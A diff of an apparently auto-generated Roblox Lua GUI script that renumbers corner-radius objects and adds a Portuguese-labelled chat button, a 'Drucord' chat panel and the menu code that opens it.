+Converted["_UICorner60"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner60"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner60"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner60"].Parent = Converted["_syncButton"]
 
 Converted["_UITextSizeConstraint64"].MaxTextSize = 20
 Converted["_UITextSizeConstraint64"].Parent = Converted["_syncButton"]
@@ -2353,12 +2361,12 @@ Converted["_TpButton"].Size = UDim2.new(0.287284046, 0, 0.17749913, 0)
 Converted["_TpButton"].Name = "TpButton"
 Converted["_TpButton"].Parent = Converted["_Cmds"]
 
-Converted["_UICorner62"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner62"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner62"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner62"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner62"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner62"].Parent = Converted["_TpButton"]
+Converted["_UICorner61"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner61"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner61"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner61"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner61"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner61"].Parent = Converted["_TpButton"]
 
 Converted["_UITextSizeConstraint65"].MaxTextSize = 20
 Converted["_UITextSizeConstraint65"].Parent = Converted["_TpButton"]
@@ -2383,12 +2391,12 @@ Converted["_carinhoButton"].Size = UDim2.new(0.287284046, 0, 0.17749913, 0)
 Converted["_carinhoButton"].Name = "carinhoButton"
 Converted["_carinhoButton"].Parent = Converted["_Cmds"]
 
-Converted["_UICorner63"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner63"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner63"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner63"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner63"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner63"].Parent = Converted["_carinhoButton"]
+Converted["_UICorner62"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner62"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner62"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner62"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner62"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner62"].Parent = Converted["_carinhoButton"]
 
 Converted["_UITextSizeConstraint66"].MaxTextSize = 20
 Converted["_UITextSizeConstraint66"].Parent = Converted["_carinhoButton"]
@@ -2424,12 +2432,12 @@ Converted["_Banner"].Visible = false
 Converted["_Banner"].Name = "Banner"
 Converted["_Banner"].Parent = Converted["_Lista"]
 
-Converted["_UICorner64"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner64"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner64"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner64"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner64"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner64"].Parent = Converted["_Banner"]
+Converted["_UICorner63"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner63"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner63"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner63"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner63"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner63"].Parent = Converted["_Banner"]
 
 Converted["_UIPadding7"].PaddingBottom = UDim.new(0, 10)
 Converted["_UIPadding7"].PaddingLeft = UDim.new(0, 10)
@@ -2442,12 +2450,12 @@ Converted["_UIGridLayout5"].CellSize = UDim2.new(0.49000001, 0, 0.0700000003, 0)
 Converted["_UIGridLayout5"].SortOrder = Enum.SortOrder.LayoutOrder
 Converted["_UIGridLayout5"].Parent = Converted["_Lista"]
 
-Converted["_UICorner65"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner65"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner65"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner65"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner65"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner65"].Parent = Converted["_mainFrame"]
+Converted["_UICorner64"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner64"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner64"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner64"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner64"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner64"].Parent = Converted["_mainFrame"]
 
 Converted["_menu"].AnchorPoint = Vector2.new(0.5, 0.5)
 Converted["_menu"].BackgroundColor3 = Color3.fromRGB(24.000000469386578, 30.00000011175871, 45.00000111758709)
@@ -2458,12 +2466,12 @@ Converted["_menu"].Size = UDim2.new(0.280085951, 0, 0.808737814, 0)
 Converted["_menu"].Name = "menu"
 Converted["_menu"].Parent = Converted["_mainFrame"]
 
-Converted["_UICorner66"].BottomLeftRadius = UDim.new(0.0500000007, 0)
-Converted["_UICorner66"].BottomRightRadius = UDim.new(0.0500000007, 0)
-Converted["_UICorner66"].CornerRadius = UDim.new(0.0500000007, 0)
-Converted["_UICorner66"].TopLeftRadius = UDim.new(0.0500000007, 0)
-Converted["_UICorner66"].TopRightRadius = UDim.new(0.0500000007, 0)
-Converted["_UICorner66"].Parent = Converted["_menu"]
+Converted["_UICorner65"].BottomLeftRadius = UDim.new(0.0500000007, 0)
+Converted["_UICorner65"].BottomRightRadius = UDim.new(0.0500000007, 0)
+Converted["_UICorner65"].CornerRadius = UDim.new(0.0500000007, 0)
+Converted["_UICorner65"].TopLeftRadius = UDim.new(0.0500000007, 0)
+Converted["_UICorner65"].TopRightRadius = UDim.new(0.0500000007, 0)
+Converted["_UICorner65"].Parent = Converted["_menu"]
 
 Converted["_voxupButton"].Font = Enum.Font.FredokaOne
 Converted["_voxupButton"].Text = ""
@@ -2483,12 +2491,12 @@ Converted["_voxupButton"].ZIndex = 2
 Converted["_voxupButton"].Name = "voxupButton"
 Converted["_voxupButton"].Parent = Converted["_menu"]
 
-Converted["_UICorner67"].BottomLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner67"].BottomRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner67"].CornerRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner67"].TopLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner67"].TopRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner67"].Parent = Converted["_voxupButton"]
+Converted["_UICorner66"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner66"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner66"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner66"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner66"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner66"].Parent = Converted["_voxupButton"]
 
 Converted["_UITextSizeConstraint67"].MaxTextSize = 25
 Converted["_UITextSizeConstraint67"].Parent = Converted["_voxupButton"]
@@ -2526,12 +2534,12 @@ Converted["_stalkerButton"].ZIndex = 2
 Converted["_stalkerButton"].Name = "stalkerButton"
 Converted["_stalkerButton"].Parent = Converted["_menu"]
 
-Converted["_UICorner68"].BottomLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner68"].BottomRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner68"].CornerRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner68"].TopLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner68"].TopRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner68"].Parent = Converted["_stalkerButton"]
+Converted["_UICorner67"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner67"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner67"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner67"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner67"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner67"].Parent = Converted["_stalkerButton"]
 
 Converted["_UITextSizeConstraint68"].MaxTextSize = 25
 Converted["_UITextSizeConstraint68"].Parent = Converted["_stalkerButton"]
@@ -2569,12 +2577,12 @@ Converted["_animaButton"].ZIndex = 2
 Converted["_animaButton"].Name = "animaButton"
 Converted["_animaButton"].Parent = Converted["_menu"]
 
-Converted["_UICorner69"].BottomLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner69"].BottomRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner69"].CornerRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner69"].TopLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner69"].TopRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner69"].Parent = Converted["_animaButton"]
+Converted["_UICorner68"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner68"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner68"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner68"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner68"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner68"].Parent = Converted["_animaButton"]
 
 Converted["_UITextSizeConstraint69"].MaxTextSize = 25
 Converted["_UITextSizeConstraint69"].Parent = Converted["_animaButton"]
@@ -2612,12 +2620,12 @@ Converted["_MoviButton"].ZIndex = 2
 Converted["_MoviButton"].Name = "MoviButton"
 Converted["_MoviButton"].Parent = Converted["_menu"]
 
-Converted["_UICorner70"].BottomLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner70"].BottomRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner70"].CornerRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner70"].TopLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner70"].TopRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner70"].Parent = Converted["_MoviButton"]
+Converted["_UICorner69"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner69"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner69"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner69"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner69"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner69"].Parent = Converted["_MoviButton"]
 
 Converted["_UITextSizeConstraint70"].MaxTextSize = 25
 Converted["_UITextSizeConstraint70"].Parent = Converted["_MoviButton"]
@@ -2655,12 +2663,12 @@ Converted["_ConfigButton"].ZIndex = 2
 Converted["_ConfigButton"].Name = "ConfigButton"
 Converted["_ConfigButton"].Parent = Converted["_menu"]
 
-Converted["_UICorner71"].BottomLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner71"].BottomRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner71"].CornerRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner71"].TopLeftRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner71"].TopRightRadius = UDim.new(0.100000001, 0)
-Converted["_UICorner71"].Parent = Converted["_ConfigButton"]
+Converted["_UICorner70"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner70"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner70"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner70"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner70"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner70"].Parent = Converted["_ConfigButton"]
 
 Converted["_UITextSizeConstraint71"].MaxTextSize = 25
 Converted["_UITextSizeConstraint71"].Parent = Converted["_ConfigButton"]
@@ -2690,8 +2698,48 @@ Converted["_UIPadding8"].PaddingRight = UDim.new(0, 10)
 Converted["_UIPadding8"].PaddingTop = UDim.new(0, 10)
 Converted["_UIPadding8"].Parent = Converted["_menu"]
 
-Converted["_UIAspectRatioConstraint"].AspectRatio = 1.355339765548706
-Converted["_UIAspectRatioConstraint"].Parent = Converted["_mainFrame"]
+Converted["_ChatButton"].Font = Enum.Font.FredokaOne
+Converted["_ChatButton"].Text = ""
+Converted["_ChatButton"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_ChatButton"].TextScaled = true
+Converted["_ChatButton"].TextSize = 15
+Converted["_ChatButton"].TextWrapped = true
+Converted["_ChatButton"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_ChatButton"].BackgroundColor3 = Color3.fromRGB(53.00000064074993, 61.00000016391277, 84.00000259280205)
+Converted["_ChatButton"].BorderColor3 = Color3.fromRGB(245.00000059604645, 197.0000034570694, 255)
+Converted["_ChatButton"].BorderMode = Enum.BorderMode.Inset
+Converted["_ChatButton"].BorderSizePixel = 0
+Converted["_ChatButton"].LayoutOrder = 5
+Converted["_ChatButton"].Position = UDim2.new(0.5, 0, 0.075000003, 0)
+Converted["_ChatButton"].Size = UDim2.new(1, 0, 0.150000006, 0)
+Converted["_ChatButton"].ZIndex = 2
+Converted["_ChatButton"].Name = "ChatButton"
+Converted["_ChatButton"].Parent = Converted["_menu"]
+
+Converted["_UICorner71"].BottomLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner71"].BottomRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner71"].CornerRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner71"].TopLeftRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner71"].TopRightRadius = UDim.new(0.100000001, 0)
+Converted["_UICorner71"].Parent = Converted["_ChatButton"]
+
+Converted["_UITextSizeConstraint72"].MaxTextSize = 25
+Converted["_UITextSizeConstraint72"].Parent = Converted["_ChatButton"]
+
+Converted["_TextLabel19"].Font = Enum.Font.FredokaOne
+Converted["_TextLabel19"].Text = "Chat"
+Converted["_TextLabel19"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextLabel19"].TextScaled = true
+Converted["_TextLabel19"].TextSize = 14
+Converted["_TextLabel19"].TextWrapped = true
+Converted["_TextLabel19"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_TextLabel19"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextLabel19"].BackgroundTransparency = 1
+Converted["_TextLabel19"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextLabel19"].BorderSizePixel = 0
+Converted["_TextLabel19"].Position = UDim2.new(0.5, 0, 0.5, 0)
+Converted["_TextLabel19"].Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
+Converted["_TextLabel19"].Parent = Converted["_ChatButton"]
 
 Converted["_hpx"].Font = Enum.Font.FredokaOne
 Converted["_hpx"].Text = "HPX"
@@ -2708,6 +2756,9 @@ Converted["_hpx"].Position = UDim2.new(0.0718253627, 0, -9.73278489e-08, 0)
 Converted["_hpx"].Size = UDim2.new(0.16915682, 0, 0.16796127, 0)
 Converted["_hpx"].Name = "hpx"
 Converted["_hpx"].Parent = Converted["_mainFrame"]
+
+Converted["_UIAspectRatioConstraint"].AspectRatio = 1.355339765548706
+Converted["_UIAspectRatioConstraint"].Parent = Converted["_mainFrame"]
 
 Converted["_UIStroke8"].Color = Color3.fromRGB(36.00000165402889, 0, 54.00000438094139)
 Converted["_UIStroke8"].Parent = Converted["_mainFrame"]
@@ -2727,6 +2778,152 @@ Converted["_Versao"].Size = UDim2.new(0.101262793, 0, 0.0477915443, 0)
 Converted["_Versao"].Name = "Versao"
 Converted["_Versao"].Parent = Converted["_mainFrame"]
 
+Converted["_ChatFrame"].BackgroundColor3 = Color3.fromRGB(24.000000469386578, 30.00000011175871, 45.00000111758709)
+Converted["_ChatFrame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_ChatFrame"].BorderSizePixel = 0
+Converted["_ChatFrame"].Position = UDim2.new(0.31099999, 0, 0.167999998, 0)
+Converted["_ChatFrame"].Size = UDim2.new(0.675999999, 0, 0.809000015, 0)
+Converted["_ChatFrame"].Name = "ChatFrame"
+Converted["_ChatFrame"].Parent = Converted["_mainFrame"]
+
+Converted["_UICorner72"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner72"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner72"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner72"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner72"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner72"].Parent = Converted["_ChatFrame"]
+
+Converted["_UIPadding9"].PaddingBottom = UDim.new(0, 10)
+Converted["_UIPadding9"].PaddingLeft = UDim.new(0, 10)
+Converted["_UIPadding9"].PaddingRight = UDim.new(0, 10)
+Converted["_UIPadding9"].PaddingTop = UDim.new(0, 10)
+Converted["_UIPadding9"].Parent = Converted["_ChatFrame"]
+
+Converted["_UIListLayout3"].Padding = UDim.new(0.00999999978, 0)
+Converted["_UIListLayout3"].HorizontalAlignment = Enum.HorizontalAlignment.Center
+Converted["_UIListLayout3"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout3"].Parent = Converted["_ChatFrame"]
+
+Converted["_Drucord"].Font = Enum.Font.FredokaOne
+Converted["_Drucord"].Text = "Drucord"
+Converted["_Drucord"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_Drucord"].TextScaled = true
+Converted["_Drucord"].TextSize = 14
+Converted["_Drucord"].TextWrapped = true
+Converted["_Drucord"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_Drucord"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_Drucord"].BackgroundTransparency = 1
+Converted["_Drucord"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Drucord"].BorderSizePixel = 0
+Converted["_Drucord"].LayoutOrder = 1
+Converted["_Drucord"].Position = UDim2.new(0.2962071, 0, 0, 0)
+Converted["_Drucord"].Size = UDim2.new(0.261879086, 0, 0.0911473483, 0)
+Converted["_Drucord"].Name = "Drucord"
+Converted["_Drucord"].Parent = Converted["_ChatFrame"]
+
+Converted["_ImageLabel1"].Image = "rbxassetid://103468753888091"
+Converted["_ImageLabel1"].ImageContent = Content{SourceType=Uri, Uri=rbxassetid://103468753888091}
+Converted["_ImageLabel1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_ImageLabel1"].BackgroundTransparency = 1
+Converted["_ImageLabel1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_ImageLabel1"].BorderSizePixel = 0
+Converted["_ImageLabel1"].Position = UDim2.new(-0.444144666, 0, -0.260872275, 0)
+Converted["_ImageLabel1"].Size = UDim2.new(0.435250193, 0, 1.42293966, 0)
+Converted["_ImageLabel1"].Parent = Converted["_Drucord"]
+
+Converted["_Chat"].ImageTransparency = 0.7200000286102295
+Converted["_Chat"].BackgroundColor3 = Color3.fromRGB(57.00000420212746, 57.00000420212746, 84.00000259280205)
+Converted["_Chat"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Chat"].BorderSizePixel = 0
+Converted["_Chat"].LayoutOrder = 2
+Converted["_Chat"].Position = UDim2.new(-0.0149958357, 0, 0.101147413, 0)
+Converted["_Chat"].Size = UDim2.new(1.02999175, 0, 0.898458183, 0)
+Converted["_Chat"].Name = "Chat"
+Converted["_Chat"].Parent = Converted["_ChatFrame"]
+
+Converted["_UICorner73"].BottomLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner73"].BottomRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner73"].CornerRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner73"].TopLeftRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner73"].TopRightRadius = UDim.new(0.0199999996, 0)
+Converted["_UICorner73"].Parent = Converted["_Chat"]
+
+Converted["_escrita"].CursorPosition = -1
+Converted["_escrita"].Font = Enum.Font.FredokaOne
+Converted["_escrita"].PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_escrita"].PlaceholderText = "Digite uma mensagem"
+Converted["_escrita"].Text = ""
+Converted["_escrita"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_escrita"].TextScaled = true
+Converted["_escrita"].TextSize = 14
+Converted["_escrita"].TextWrapped = true
+Converted["_escrita"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_escrita"].BackgroundColor3 = Color3.fromRGB(87.00000241398811, 87.00000241398811, 111.00000858306885)
+Converted["_escrita"].BorderColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_escrita"].BorderSizePixel = 0
+Converted["_escrita"].Position = UDim2.new(0.0205765441, 0, 0.858138919, 0)
+Converted["_escrita"].Size = UDim2.new(0.834029019, 0, 0.108060502, 0)
+Converted["_escrita"].Name = "escrita"
+Converted["_escrita"].Parent = Converted["_Chat"]
+
+Converted["_UICorner74"].BottomLeftRadius = UDim.new(0.300000012, 0)
+Converted["_UICorner74"].BottomRightRadius = UDim.new(0.300000012, 0)
+Converted["_UICorner74"].CornerRadius = UDim.new(0.300000012, 0)
+Converted["_UICorner74"].TopLeftRadius = UDim.new(0.300000012, 0)
+Converted["_UICorner74"].TopRightRadius = UDim.new(0.300000012, 0)
+Converted["_UICorner74"].Parent = Converted["_escrita"]
+
+Converted["_UIPadding10"].PaddingLeft = UDim.new(0.0549999997, 0)
+Converted["_UIPadding10"].Parent = Converted["_escrita"]
+
+Converted["_UITextSizeConstraint73"].MaxTextSize = 14
+Converted["_UITextSizeConstraint73"].Parent = Converted["_escrita"]
+
+Converted["_Enviar"].AutoButtonColor = false
+Converted["_Enviar"].BackgroundColor3 = Color3.fromRGB(0, 170.0000050663948, 0)
+Converted["_Enviar"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Enviar"].BorderSizePixel = 0
+Converted["_Enviar"].Position = UDim2.new(0.88479197, 0, 0.858138978, 0)
+Converted["_Enviar"].Size = UDim2.new(0.0850567818, 0, 0.108060502, 0)
+Converted["_Enviar"].Name = "Enviar"
+Converted["_Enviar"].Parent = Converted["_Chat"]
+
+Converted["_UICorner75"].BottomLeftRadius = UDim.new(0.200000003, 0)
+Converted["_UICorner75"].BottomRightRadius = UDim.new(0.200000003, 0)
+Converted["_UICorner75"].CornerRadius = UDim.new(0.200000003, 0)
+Converted["_UICorner75"].TopLeftRadius = UDim.new(0.200000003, 0)
+Converted["_UICorner75"].TopRightRadius = UDim.new(0.200000003, 0)
+Converted["_UICorner75"].Parent = Converted["_Enviar"]
+
+Converted["_ImageLabel2"].Image = "rbxassetid://75253323053409"
+Converted["_ImageLabel2"].ImageContent = Content{SourceType=Uri, Uri=rbxassetid://75253323053409}
+Converted["_ImageLabel2"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_ImageLabel2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_ImageLabel2"].BackgroundTransparency = 1
+Converted["_ImageLabel2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_ImageLabel2"].BorderSizePixel = 0
+Converted["_ImageLabel2"].Position = UDim2.new(0.5, 0, 0.5, 0)
+Converted["_ImageLabel2"].Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
+Converted["_ImageLabel2"].Parent = Converted["_Enviar"]
+
+Converted["_online"].Font = Enum.Font.FredokaOne
+Converted["_online"].Text = "Online : 0"
+Converted["_online"].TextColor3 = Color3.fromRGB(0, 255, 0)
+Converted["_online"].TextScaled = true
+Converted["_online"].TextSize = 14
+Converted["_online"].TextWrapped = true
+Converted["_online"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_online"].BackgroundTransparency = 1
+Converted["_online"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_online"].BorderSizePixel = 0
+Converted["_online"].Position = UDim2.new(0.776764989, 0, 0.0292255934, 0)
+Converted["_online"].Size = UDim2.new(0.184289694, 0, 0.0617488548, 0)
+Converted["_online"].Name = "online"
+Converted["_online"].Parent = Converted["_Chat"]
+
+Converted["_UITextSizeConstraint74"].MaxTextSize = 20
+Converted["_UITextSizeConstraint74"].Parent = Converted["_online"]
+
 -- Fake Module Scripts:
 
 local fake_module_scripts = {}
@@ -2734,7 +2931,7 @@ local fake_module_scripts = {}
 
 -- Fake Local Scripts:
 
-local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.MenuButtons
+local function KAPUQIX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.MenuButtons
     local script = Instance.new("LocalScript")
     script.Name = "MenuButtons"
     script.Parent = Converted["_mainFrame"]
@@ -2747,8 +2944,8 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
         return req(obj)
     end
 
-	local mainFrame = script.Parent
 	
+	local mainFrame = script.Parent
 	local menu = mainFrame:WaitForChild("menu")
 	
 	-- BOT�ES
@@ -2757,6 +2954,7 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	local animaButton = menu:WaitForChild("animaButton")
 	local stalkerButton = menu:WaitForChild("stalkerButton")
 	local voxButton = menu:WaitForChild("voxupButton")
+	local chatButton = menu:WaitForChild("ChatButton")
 	
 	-- FRAMES
 	local configUS = mainFrame:WaitForChild("configUS")
@@ -2764,6 +2962,7 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	local animacoes = mainFrame:WaitForChild("anima��es")
 	local stalker = mainFrame:WaitForChild("stalker")
 	local voxUp = mainFrame:WaitForChild("voxUp")
+	local chatFrame = mainFrame:WaitForChild("ChatFrame")
 	
 	-- ESCONDER TODOS
 	local function esconderTudo()
@@ -2772,6 +2971,7 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 		animacoes.Visible = false
 		stalker.Visible = false
 		voxUp.Visible = false
+		chatFrame.Visible = false
 	end
 	
 	-- ABRIR CONFIG
@@ -2804,6 +3004,11 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 		voxUp.Visible = true
 	end
 	
+	-- ABRIR CHAT
+	local function abrirChat()
+		esconderTudo()
+		chatFrame.Visible = true
+	end
 	
 	-- CONEX�ES
 	configButton.MouseButton1Click:Connect(abrirConfig)
@@ -2811,12 +3016,13 @@ local function LKAKVQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	animaButton.MouseButton1Click:Connect(abrirAnimacoes)
 	stalkerButton.MouseButton1Click:Connect(abrirStalker)
 	voxButton.MouseButton1Click:Connect(abrirVox)
-	
+	chatButton.MouseButton1Click:Connect(abrirChat)
 	
 	-- MENU PADR�O
 	abrirConfig()
+	
 end
-local function HPNV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.FotoConfig
+local function HKKI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.FotoConfig
     local script = Instance.new("LocalScript")
     script.Name = "FotoConfig"
     script.Parent = Converted["_mainFrame"]
@@ -2855,7 +3061,7 @@ local function HPNV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	imageLabel.Image = content
 	
 end
-local function LCPU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.H
+local function FXKTC_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.H
     local script = Instance.new("LocalScript")
     script.Name = "H"
     script.Parent = Converted["_mainFrame"]
@@ -2982,7 +3188,7 @@ local function LCPU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 		end
 	end)
 end
-local function ZCKTRJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.LocalScript
+local function SVBIRU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_configUS"]
@@ -3001,7 +3207,7 @@ local function ZCKTRJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	usernameLabel.Text = player.DisplayName .. " ( " .. player.Name .. " )"
 end
-local function EJRWW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.pingLabel.LocalScript
+local function ZUFZO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.pingLabel.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_pingLabel"]
@@ -3046,7 +3252,7 @@ local function EJRWW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 		task.wait(1)
 	end
 end
-local function NAMWM_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.fpsLabel.LocalScript
+local function QNKFLJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.fpsLabel.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_fpsLabel"]
@@ -3095,7 +3301,7 @@ local function NAMWM_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 		end
 	end)
 end
-local function QSTJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.platformLabel.LocalScript
+local function EFWM_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.configUS.platformLabel.LocalScript
